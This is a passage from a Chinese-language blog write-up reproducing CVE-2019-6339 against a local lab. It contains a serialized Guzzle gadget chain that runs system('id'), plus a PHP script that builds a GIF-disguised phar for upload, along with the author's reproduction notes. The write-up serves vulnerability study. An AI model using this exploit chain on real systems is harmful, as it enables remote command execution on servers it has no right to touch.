base64encode 還有 urlencode 的結果，可以稍微看一下產出大概會長什麼樣子</li>\n</ul>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O<span class=\"punctuation\">:</span><span class=\"number\">24</span><span class=\"punctuation\">:</span><span class=\"attr\">&quot;GuzzleHttp\\Psr7\\FnStream&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">2</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span>s<span class=\"punctuation\">:</span><span class=\"number\">33</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;�GuzzleHttp\\Psr7\\FnStream�methods&quot;</span>;a<span class=\"punctuation\">:</span><span class=\"number\">1</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span>s<span class=\"punctuation\">:</span><span class=\"number\">5</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;close&quot;</span>;a<span class=\"punctuation\">:</span><span class=\"number\">2</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span>i<span class=\"punctuation\">:</span><span class=\"number\">0</span>;O<span class=\"punctuation\">:</span><span class=\"number\">23</span><span class=\"punctuation\">:</span><span class=\"attr\">&quot;GuzzleHttp\\HandlerStack&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">3</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span>s<span class=\"punctuation\">:</span><span class=\"number\">32</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;�GuzzleHttp\\HandlerStack�handler&quot;</span>;s<span class=\"punctuation\">:</span><span class=\"number\">2</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;id&quot;</span>;s<span class=\"punctuation\">:</span><span class=\"number\">30</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;�GuzzleHttp\\HandlerStack�stack&quot;</span>;a<span class=\"punctuation\">:</span><span class=\"number\">1</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span>i<span class=\"punctuation\">:</span><span class=\"number\">0</span>;a<span class=\"punctuation\">:</span><span class=\"number\">1</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span>i<span class=\"punctuation\">:</span><span class=\"number\">0</span>;s<span class=\"punctuation\">:</span><span class=\"number\">6</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;system&quot;</span>;<span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span>s<span class=\"punctuation\">:</span><span class=\"number\">31</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;�GuzzleHttp\\HandlerStack�cached&quot;</span>;N;<span class=\"punctuation\">&#125;</span>i<span class=\"punctuation\">:</span><span class=\"number\">1</span>;s<span class=\"punctuation\">:</span><span class=\"number\">7</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;resolve&quot;</span>;<span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span>s<span class=\"punctuation\">:</span><span class=\"number\">9</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;_fn_close&quot;</span>;a<span class=\"punctuation\">:</span><span class=\"number\">2</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span>i<span class=\"punctuation\">:</span><span class=\"number\">0</span>;r<span class=\"punctuation\">:</span><span class=\"number\">4</span>;i<span class=\"punctuation\">:</span><span class=\"number\">1</span>;s<span class=\"punctuation\">:</span><span class=\"number\">7</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;resolve&quot;</span>;<span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>亂數的地方是 <code>%00</code> 這個跟 class 中參數是 private 有關</li>\n<li>還需要一個 script 把這些東西裝到 phar 檔案裡面</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// poc.php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;phar.readonly&quot;</span>,<span class=\"number\">0</span>); </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$o</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"string\">&#x27;TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoyOntzOjMzOiIAR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtAG1ldGhvZHMiO2E6MTp7czo1OiJjbG9zZSI7YToyOntpOjA7TzoyMzoiR3V6emxlSHR0cFxIYW5kbGVyU3RhY2siOjM6e3M6MzI6IgBHdXp6bGVIdHRwXEhhbmRsZXJTdGFjawBoYW5kbGVyIjtzOjI6ImlkIjtzOjMwOiIAR3V6emxlSHR0cFxIYW5kbGVyU3RhY2sAc3RhY2siO2E6MTp7aTowO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fXM6MzE6IgBHdXp6bGVIdHRwXEhhbmRsZXJTdGFjawBjYWNoZWQiO047fWk6MTtzOjc6InJlc29sdmUiO319czo5OiJfZm5fY2xvc2UiO2E6Mjp7aTowO3I6NDtpOjE7czo3OiJyZXNvbHZlIjt9fQ==&#x27;</span>));</span><br><span class=\"line\"><span class=\"comment\">// print_r(serialize($a));</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$filename</span> = <span class=\"string\">&#x27;poc.phar&#x27;</span>;<span class=\"comment\">// 后缀必须为phar，否则程序无法运行</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$filename</span>) ? <span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>) : <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$phar</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;foo.txt&quot;</span>,<span class=\"string\">&quot;bar&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;cp poc.phar poc.gif&quot;</span>);</span><br></pre></td></tr></table></figure>\n<ul>\n<li>之後找一個可以上傳圖片的地方上傳就可以啦\n<ul>\n<li><a href=\"http://0.0.0.0:9898/user/1/edit\" target=\"_blank\">http://0.0.0.0:9898/user/1/edit</a></li>\n</ul>\n</li>\n<li>還有一個小事情要注意，在跑 <code>poc.php</code> 的時候要加上這個 flag，不然會報錯 phar 有安全問題之類的\n<ul>\n<li><code>php --define phar.readonly=0 poc.php</code></li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://i.imgur.com/q9hOhRj.png\" alt=\"\" loading=\"lazy\" class=\"φbp\"></p>\n<h3 id=\"踩坑-&amp;-心得\">踩坑 &amp; 心得<a title=\"#踩坑-&amp;-心得\" href=\"#踩坑-&amp;-心得\"></a></h3>\n<ul>\n<li>採比較多坑的地方應該是在寫 PoC 的時候，對 php 的 namespace 比較不熟，不過看了一下 vender 裡面怎麼 call 的也還好</li>\n<li>之後在找 <code>$prev = $fn[0]($prev);</code> 找了很久，我是透過搜尋 <code>function __destruct()</code> 還有 <code>function __invoke()</code> 這種比較容易觸發的 magic method 的時候翻到的，我有點不確定這樣找是不是正確的 Orz，希望有比較快的方法</li>\n<li>其餘的就沒有了，除了串起來比較麻煩以外這個漏洞本身並不複雜</li>\n</ul>\n","prev":{"title":"CVE-2023-28115","link":"2023/03/23/CVE-2023-28115"},"next":{"title":"Pug SSTI","link":"2023/03/13/Pug-SSTI"},"plink":"https://entroychang.github.io/2023/03/21/CVE-2019-6339/","toc":[{"id":"cve-2019-6339","title":"CVE-2019-6339","index":"1","children":[{"id":"復現環境","title":"復現環境","index":"1.1"},{"id":"phar","title":"Phar","index":"1.2"},{"id":"序列化和反序列化","title":"序列化和反序列化","index":"1.3"},{"id":"漏洞分析","title":"漏洞分析","index":"1.4"},{"id":"踩坑-&-心得","title":"踩坑 &amp; 心得","index":"1.5"}]}],"reading_time":"2889 words in 19 min"}